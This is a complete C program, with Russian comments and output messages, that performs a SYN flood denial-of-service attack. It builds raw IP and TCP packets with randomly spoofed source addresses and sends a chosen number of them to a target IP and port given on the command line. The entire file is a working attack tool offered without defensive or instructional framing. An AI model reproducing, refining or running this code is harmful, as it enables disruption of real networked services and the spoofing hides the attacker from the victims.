#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define PACKET_LEN 4096


unsigned short checksum(void *b, int len) {
    /* Compute Internet Checksum for "count" bytes
     *         beginning at location "addr".
     */
    unsigned long sum = 0;
    unsigned short *addr = (unsigned short *)b; // приведение указателя

     while( len > 1 )  {
        /*  This is the inner loop */
            sum += *addr++;
            len -= 2;
    }

        /*  Add left-over byte, if any */
    if( len > 0 )
            sum += *(unsigned char *)addr;

        /*  Fold 32-bit sum to 16 bits */
    while (sum>>16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (unsigned short)(~sum);
}
// Генерация случайного IP
char* generate_random_ip() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, 
             rand() % 256, rand() % 256);
    return ip;
}

void syn_flood(const char *target_ip, int target_port, int packet_count) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        perror("Ошибка создания raw-сокета");
        exit(EXIT_FAILURE);
    }

    // Включаем ручное заполнение IP-заголовка
    int one = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Ошибка setsockopt");
        close(s);
        exit(EXIT_FAILURE);
    }

    char packet[PACKET_LEN];
    struct sockaddr_in sin;
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Настройка адреса назначения
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    printf("[+] Начинаем SYN-флуд %s:%d\n", target_ip, target_port);

    for(int i = 1; i <= packet_count; i++) {
        memset(packet, 0, PACKET_LEN);

        // Заполнение IP-заголовка
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->daddr = sin.sin_addr.s_addr;

        // Генерация случайного исходного IP
        char *random_ip = generate_random_ip();
        iph->saddr = inet_addr(random_ip);

        // Заполнение TCP-заголовка
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand() % 4294967295);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;  // Устанавливаем SYN-флаг
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        // Расчет контрольных сумм
        iph->check = checksum((unsigned short *)packet, iph->tot_len >> 1);
        
        // Псевдозаголовок для TCP checksum
        struct {
            u_int32_t saddr;
            u_int32_t daddr;
            u_int8_t zero;
            u_int8_t protocol;
            u_int16_t tcp_len;
        } pseudo_header;

        pseudo_header.saddr = iph->saddr;
        pseudo_header.daddr = iph->daddr;
        pseudo_header.zero = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_len = htons(sizeof(struct tcphdr));

        int psize = sizeof(pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char *)&pseudo_header, sizeof(pseudo_header));
        memcpy(pseudogram + sizeof(pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short *)pseudogram, psize / 2);
        free(pseudogram);

        // Отправка пакета
        if(sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("Ошибка sendto");
        } else {
            printf("[+] Отправлен пакет #%d от %s\n", i, random_ip);
        }

        usleep(10000);  // Задержка 10 мс между пакетами
    }

    close(s);
}

int main(int argc, char *argv[]) {
    if(argc != 4) {
        printf("Использование: %s <IP> <Порт> <Количество пакетов>\n", argv[0]);
        printf("Пример: %s 192.168.1.100 80 100\n", argv[0]);
        return EXIT_FAILURE;
    }

    srand(time(NULL));  // Инициализация генератора случайных чисел
    
    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int packet_count = atoi(argv[3]);

    syn_flood(target_ip, target_port, packet_count);

    return EXIT_SUCCESS;
}